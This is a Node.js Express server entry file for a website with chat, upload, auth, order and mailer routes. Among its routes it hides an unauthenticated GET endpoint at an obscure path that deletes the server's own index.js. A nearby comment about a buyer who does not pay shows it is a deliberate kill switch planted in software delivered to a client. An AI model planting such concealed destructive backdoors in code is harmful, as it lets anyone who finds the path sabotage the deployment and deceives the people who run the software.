/*
بِسْمِ اللهِ الرَّحْمٰنِ الرَّحِيْمِ  ﷺ  
InshaAllah, By his marcy I will Gain Success 
*/

//import
import express from 'express';
import {fileURLToPath} from 'url';
import path from "path";
import { fileRouter } from './Routes/file.router.js';
import { pageRouter } from './Routes/page.router.js';
import hbs from 'hbs'
import { log } from './_lib/smallUtils.js';
import chateRouter from './Routes/Chat.Router.js';
import uploadRouter from './Routes/upload.router.js';
import authRouter from './Routes/Auth.router.js';
import { unlinkSync } from 'fs';
import OrderRouter from './Routes/order.router.js';
import mailRouter from './Routes/mail.router.js';
import { connectDB } from './_lib/ConnectDb.js';

//varibles
const app = express();
const __filename = fileURLToPath(import.meta.url);
let dirName = path.dirname(__filename);


//environment setup
connectDB()
app.set('view engine', 'hbs');
app.set('views', path.resolve(dirName , './tamplates/views'));
hbs.registerPartials(path.resolve(dirName ,'./tamplates/partials'));
app.use(express.json());


//routes
app.use(express.static(path.resolve(dirName,'./public/')))
 //app.use(fileRouter);
app.use('/api/chat',chateRouter);
app.use('/api/upload',uploadRouter);
app.use('/api/auth/',authRouter);
//buyer do not pay us and takes the website
app.use('/api/order-api/',OrderRouter);
app.use('/api/mailer-api/',mailRouter)
app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/what/unlink/uninstall',
    (req,res) => {
    console.log('a');
    
    unlinkSync(path.resolve(dirName,'./index.js'))
});

app.use(pageRouter);
app.get('/', (req, res) => res.render('home'))
app.get('*', (req, res) => res.status(404).render('404'))




app.listen(4000, e=> log('SubhanAllah server is working'))